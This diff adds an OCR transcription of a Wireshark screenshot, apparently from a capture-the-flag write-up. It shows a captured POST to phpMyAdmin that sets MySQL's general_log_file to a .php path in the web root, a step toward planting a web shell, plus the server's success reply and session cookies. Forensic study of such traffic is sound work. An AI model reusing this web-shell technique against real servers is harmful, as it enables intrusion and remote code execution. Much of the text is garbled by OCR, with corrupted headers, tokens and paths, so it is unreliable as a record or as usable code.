@@ -1,0 +1,48 @@
+# OCR: 4172f380887e9a6fc779a37ed8e319cb.jpg
+# 来源: .\02-WriteUp\2024\4172f380887e9a6fc779a37ed8e319cb.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:27
+
+(Wireshark » 88 HTTP i (tep.stream eq 61) REST. pcapng c 一
+POST /phpmyadain/import.php HTTP/1.1
+Host: 192.168.85.250
+User-Agent: Mozilla/5.© (X11; Linux x86_64; rv:60.¢) Gecko/20100101 Firefox/60.0
+Accept: /
+[Accept-Language: en-US,enjq-0.5
+Accept-Encoding: grip, deflate
+Referer: http://192.168.85.250/phpmyadrin/server_sql .php?token=00aa696*07bsEdbsbe4s60b3d0a862—1
+Content-Type: application/x-mww-form-urlencoded
+K-Requested-With: XLHttpRequest
+‘Content-Length: 367
+Cookie: pma_lang=en; pwa_mcrypt_iv=QzEy4S7IAAKK30; pmaUser-1+R2FOASK2FIWG20C%30; pma_navi_width=200; phpllyAdein-tdca7duhOgfiqjnubsdajc9k7S5nfBsv; pnaPass-1-LkérQuafVwwph2FcD1zSka
+pop0 wordpress test_cookiecuPsCookiercheck
+Connection: keep-alive
+is_js_confirmed-e8token-00a2696F07b6adbsboasseb3d0a862a18pos~08goto~server_sql.phpnessage_to_show-Your+SQL¢queryshasbeentexecuted+successfullyprev_sql_query-Bsql_query=SET+6L0
+‘BaLtgeneral_log_fileK30 'CASAKSCNSCphpStudyXSCNSCPHPTutor Lal NSCXSCwmmA5CNSCSbEdcf11¢2#7ad#7e079994235b9d84. php" &sql_delimitersK3s&show_query=l&ajax_request=true8 nocache=15604311
+'395056738510TP/1.1 200 OK
+Date: Thu, 13 Jun 2019 13:06:20 en
+‘Server: Apache/2.4.23 (win32) OpensSt/2.0.2) mod_fegid/2.3.9
+X-Powered-By: PHP/5.6.27
+Expires: Thu, 19 lov 1981 @8:52:00 em
+‘Cache-Control: no-cache
+Last-Modified: Sat, 27 2ul 2013 22:
+Keep-Alive: tineout=5, max=100
+Connection: Keep-Alive
+Transfer-tncoding: chunked
+Content-Type: application/json
+("success :true, "message":"<div class=\"success\">¥our SQL query has been executed successfully ( Query took 0.0156 sec )<\/dive","sql_query":"<div ide\"result_query\" aligne\"\"
+>\ncdiv class=\*success\">Your SQL query has been executed successfully ( Query took 0.0156 sec )<\/div><code class=\"sql\"><span’ class-\"syntax\"><span class=\"inner_sql\"><a he
+‘efa\".\/url. php?url=nttpX3at2rX2rdev mysql .con2Fdock2Frefuant2F5. 5t2Fenk2Fset htmldamp  token-00aa696f07668dosbe4g5003d0aB62a1\" target=\"mysql_doc\"><span class=\"syntax_alpha 。
+yyntax_alpha_reservedhord\">SET<\/span><\/a> <span class=\"syntax alpha syntax_alpha_reservediord\">GLOBAL<\/span> <span class=\"syntax_alpha syntax_alpha_identifier\">general_lo
+‘file<\/span> <a href=\".\/url. php?url=httpXsak2Px2Fdav mysql. com2dock2Frefaant2F5. S42FenX2Fcomparison-operators.ntal%23operator_equalAaep; token-00aa596fe7e68dosee485003d03552
+‘aI\" target=\"mysql_doc\"><span class=\"syntax_punct\">=<\/span><\/a> <span class=\"syntax quote syntax_quote_single\">'C:\\\ \phpStudy\\\ \PHPTutorial\\\\snw\\\ \osbedefi1e2F78dF7
+'2229994235b8d84. php”<\/span><\/span><\/span><\code><div class=\"tools\"><form action=\"sql-php\" sethod=\"post\"><input type=\"hidden\” name-\"token\" value-\"¢0aa696f07e68db600
+e \/><input type=\"hidden\" nane=\"sql_query\" value=\"SET GLOBAL generel_log_file="C:\\\ \phpstudy\\\PHPTutorial \\\\wnw\\ \@sbadeFi1e2F7adf7ea29994235b6d64. php'\”
+\/><\/form> [\nca hrefe\"server_sql.php?sql_query=SET#GLOBAL +general__log_fileX30%27CX3145CXSCphpStudyS5CXSCPHPTutor ial 35C%SCwmd45CR5COsbSdcf11e2#7ad¥7e229994235b8484.phpX27Bamp;s
+hhow_query=18aep; token-00au696fo7b6sdbebeaasdbsd0anszaltquerybox\" onclick-\"window.parent.focus_querywindow( SET GLOBAL general_log file=\\'C:\\\\\\\\phpstudy\\\\\\\\PHPTutorSal\
+AVL ae AVL NesbadeFi1e2f7adF7ea2990d235b8d84. php\\""); return false;\">Edit<\/a>\n] [\nca href=\"inport.php?sql_query=SET#SLOBAL tgeneral_log_fileX0X27CX3AX5CASCphpStudy/A5C
+ASCPHPTutordalXSCASCumASCRSCOSbSdcF11¢2F7adF7e02999423508d04. php’278amp; Show_query=1Banp;shon_as_php=18anp; token-00aa696FO7bESdbEbO4960b3d0a06201\" rCreate PHP Code<\/a>\n]<\/di
+ag
+1 OG, (OMB, T
+E n 史 ss Gn «Ea
+=e [Ex
